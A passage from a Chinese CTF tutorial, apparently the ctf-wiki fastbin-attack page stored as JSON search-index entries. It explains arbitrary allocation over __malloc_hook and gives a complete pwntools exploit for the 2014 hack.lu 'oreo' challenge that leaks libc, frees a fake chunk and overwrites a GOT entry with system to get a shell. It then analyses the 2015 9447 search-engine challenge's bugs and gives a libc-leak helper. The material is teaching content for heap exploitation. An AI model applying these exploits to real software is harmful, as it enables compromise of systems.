            "text": "\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230 _malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002  int main(void)\n{\n\n\n    void *chunk1;\n    void *chunk_a;\n\n    chunk1=malloc(0x60);\n\n    free(chunk1);\n\n \u00a0 \u00a0*(long long *)chunk1=0x7ffff7dd1af5-0x8;\n    malloc(0x60);\n    chunk_a=malloc(0x60);\n    return 0;\n} \n\u8fd9\u91cc\u76840x7ffff7dd1af5\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1b10  __malloc_hook : 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0 \n0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ\nFastbins[idx=0, size=0x10] \nFastbins[idx=1, size=0x20] \nFastbins[idx=2, size=0x30] \nFastbins[idx=3, size=0x40] \nFastbins[idx=4, size=0x50] \nFastbins[idx=5, size=0x60] \nFastbins[idx=6, size=0x70]  \n\u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0\n0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0\n\n0x7ffff7dd1af5  _IO_wide_data_0+309 :   0x000000000000007f \n\u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002  ##define fastbin_index(sz)                                                      \\      ((((unsigned int) (sz))   (SIZE_SZ == 8 ? 4 : 3)) - 2)  \n\uff08\u6ce8\u610fsz\u7684\u5927\u5c0f\u662funsigned int\uff0c\u56e0\u6b64\u53ea\u53604\u4e2a\u5b57\u8282\uff09  \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002\n\u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236  malloc_hook\u7684\u5185\u5bb9(\u5728\u6211\u7684libc\u4e2d realloc_hook\u4e0e__malloc_hook\u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002  0x4005a8  main+66         call   0x400450  malloc@plt \n \u2192   0x4005ad  main+71         mov    QWORD PTR [rbp-0x8], rax\n\n $rax   : 0x7ffff7dd1afd \n\n0x7ffff7dd1aed  _IO_wide_data_0+301 :   0xfff7dd0260000000  0x000000000000007f\n0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f\n0x7ffff7dd1b0d  __realloc_hook+5 :  0x000000000000007f  0x0000000000000000\n0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_14", 
            "text": "Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2014-hacklu-oreo", 
            "text": "", 
            "title": "2014 hack.lu oreo"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_15", 
            "text": "\u279c  2014_Hack.lu_oreo git: ( master )  file oreo\noreo: ELF  32 -bit LSB executable, Intel  80386 , version  1   ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2,  for  GNU/Linux  2 .6.26, BuildID [ sha1 ]= f591eececd05c63140b9d658578aea6c24450f8b, stripped\n\u279c  2014_Hack.lu_oreo git: ( master )  checksec oreo          [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo \n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002", 
            "title": "\u57fa\u672c\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_16", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002  \u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b  00000000   rifle             struc   ;   ( sizeof = 0x38 ,   mappedto_5 )  00000000   descript          db   25   dup ( ? )  0000001 9   name              db   27   dup ( ? )  00000034   next              dd   ?                      ;   offset  0000003 8   rifle             ends   \u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b   \u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002  \u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002  \u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002  \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f  \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002   \u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_17", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got \u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002  \u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528  house of sprit  \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002  \u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002   \u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./oreo  oreo   =   ELF ( ./oreo )  if   args [ REMOTE ]: \n     p   =   remote ( ip ,   port )  else : \n     p   =   process ( ./oreo )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   add ( descrip ,   name ): \n     p . sendline ( 1 ) \n     #p.recvuntil( Rifle name:  ) \n     p . sendline ( name ) \n     #p.recvuntil( Rifle description:  ) \n     #sleep(0.5) \n     p . sendline ( descrip )  def   show_rifle (): \n     p . sendline ( 2 ) \n     p . recvuntil ( =================================== \\n )  def   order (): \n     p . sendline ( 3 )  def   message ( notice ): \n     p . sendline ( 4 ) \n     #p.recvuntil( Enter any notice you d like to submit with your order:  ) \n     p . sendline ( notice )  def   exp (): \n     print   step 1. leak libc base \n     name   =   27   *   a   +   p32 ( oreo . got [ puts ]) \n     add ( 25   *   a ,   name ) \n     show_rifle () \n     p . recvuntil ( =================================== \\n ) \n     p . recvuntil ( Description:  ) \n     puts_addr   =   u32 ( p . recvuntil ( \\n ,   drop = True )[: 4 ]) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n\n     print   step 2. free fake chunk at 0x0804A2A8 \n\n     # now, oifle_cnt=1, we need set it = 0x40 \n     oifle   =   1 \n     while   oifle     0x3f : \n         # set next link=NULL \n         add ( 25   *   a ,   a   *   27   +   p32 ( 0 )) \n         oifle   +=   1 \n     payload   =   a   *   27   +   p32 ( 0x0804a2a8 ) \n     # set next link=0x0804A2A8, try to free a fake chunk \n     add ( 25   *   a ,   payload ) \n     # before free, we need to bypass some check \n     # fake chunk s size is 0x40 \n     # 0x20 * a  for padding the last fake chunk \n     # 0x40 for fake chunk s next chunk s prev_size \n     # 0x100 for fake chunk s next chunk s size \n     # set fake iofle  next to be NULL \n     payload   =   0x20   *   \\x00   +   p32 ( 0x40 )   +   p32 ( 0x100 ) \n     payload   =   payload . ljust ( 52 ,   b ) \n     payload   +=   p32 ( 0 ) \n     payload   =   payload . ljust ( 128 ,   c ) \n     message ( payload ) \n     # fastbin 0x40: 0x0804A2A0- some where heap- NULL \n     order () \n     p . recvuntil ( Okay order submitted! \\n ) \n\n     print   step 3. get shell \n     # modify free@got to system addr \n     payload   =   p32 ( oreo . got [ strlen ]) . ljust ( 20 ,   a ) \n     add ( payload ,   b   *   20 ) \n     log . success ( system addr:    +   hex ( system_addr )) \n     #gdb.attach(p) \n     message ( p32 ( system_addr )   +   ;/bin/sh \\x00 ) \n\n     p . interactive ()  if   __name__   ==   __main__ : \n     exp ()   \u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528  fast bin attack  \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2015-9447-ctf-search-engine", 
            "text": "", 
            "title": "2015 9447 CTF : Search Engine"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_18", 
            "text": "\u279c  2015_9447ctf_search-engine git: ( master )  file search\nsearch: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n\u279c  2015_9447ctf_search-engine git: ( master )  checksec search    [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_19", 
            "text": "\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f   \u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50  \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1)   0xFFFD  \u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49  \u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002  \u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd  \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1)   0xFFFD  \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32  \u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0  \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0  \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002    \u6ca1\u6709\u56de\u8f66\u6807\u8bb0  \u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_20", 
            "text": "\u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b  00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)\n00000000 content         dq ?\n00000008 size            dd ?\n0000000C padding1        dd ?\n00000010 sentence_ptr    dq ?                    ; offset\n00000018 len             dd ?\n0000001C padding2        dd ?\n00000020 next            dq ?                    ; offset\n00000028 word_struct     ends", 
            "title": "\u8bcd\u8bed\u7ed3\u6784\u4f53"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_21", 
            "text": "\u5206\u914d   malloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53  \u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002   \u91ca\u653e   \u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50  \u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd  \u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784", 
            "title": "\u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_22", 
            "text": "\u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e  \u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002       _flag_enter   =   flag_enter ; \n     v4   =   0 ; \n     while   (   1   ) \n     { \n       v5   =   s [ v4 ]; \n       v6   =   fread ( s [ v4 ],   1uLL ,   1uLL ,   stdin ); \n       if   (   v6   =   0   ) \n         break ; \n       if   (   * v5   ==   \\n     _flag_enter   ) \n       { \n         if   (   v4   ) \n         { \n           * v5   =   0 ; \n           return ; \n         } \n         v4   =   v6   -   1 ; \n         if   (   len   =   v6   -   1   ) \n           break ; \n       } \n       else \n       { \n         v4   +=   v6 ; \n         if   (   len   =   v4   ) \n           break ; \n       } \n     }   \u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570  __int64   read_num ()  { \n   __int64   result ;   // rax \n   char   * endptr ;   // [rsp+8h] [rbp-50h] \n   char   nptr ;   // [rsp+10h] [rbp-48h] \n   unsigned   __int64   v3 ;   // [rsp+48h] [rbp-10h] \n\n   v3   =   __readfsqword ( 0x28u ); \n   read_str ( nptr ,   48 ,   1 ); \n   result   =   strtol ( nptr ,   endptr ,   0 ); \n   if   (   endptr   ==   nptr   ) \n   { \n     __printf_chk ( 1LL ,   %s is not a valid number \\n ,   nptr ); \n     result   =   read_num (); \n   } \n   __readfsqword ( 0x28u ); \n   return   result ;  }   \u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002  \u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL     else \n   { \n     free ( v6 ); \n   }   \u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL     for   (   i   =   head ;   i ;   i   =   i - next   ) \n   { \n     if   (   * i - sentence_ptr   ) \n     { \n       if   (   LODWORD ( i - size )   ==   v0     ! memcmp (( const   void   * ) i - content ,   v1 ,   v0 )   ) \n       { \n         __printf_chk ( 1LL ,   Found %d:  ,   LODWORD ( i - len )); \n         fwrite ( i - sentence_ptr ,   1uLL ,   SLODWORD ( i - len ),   stdout ); \n         putchar ( \\n ); \n         puts ( Delete this sentence (y/n)? ); \n         read_str ( choice ,   2 ,   1 ); \n         if   (   choice   ==   y   ) \n         { \n           memset ( i - sentence_ptr ,   0 ,   SLODWORD ( i - len )); \n           free ( i - sentence_ptr ); \n           puts ( Deleted! ); \n         } \n       } \n     } \n   } \n   free ( v1 );   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i- sentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a  \\x00  \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a  \\x00  \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a  \\x00  \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7  *i- sentence_ptr  \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab  memset  \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86  \\x00  \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a  \\x00  \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7  memcmp  \u7684\u68c0\u6d4b\u3002", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_23", 
            "text": "", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_24", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740  \u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868  \u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#libc", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981  unsorted bin  \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f  \\x00  \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020  \\x00  \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b  def   leak_libc (): \n     smallbin_sentence   =   s   *   0x85   +    m  \n     index_sentence ( smallbin_sentence ) \n     search_word ( m ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     search_word ( \\x00 ) \n     p . recvuntil ( Found    +   str ( len ( smallbin_sentence ))   +   :  ) \n     unsortedbin_addr   =   u64 ( p . recv ( 8 )) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( n ) \n     return   unsortedbin_addr", 
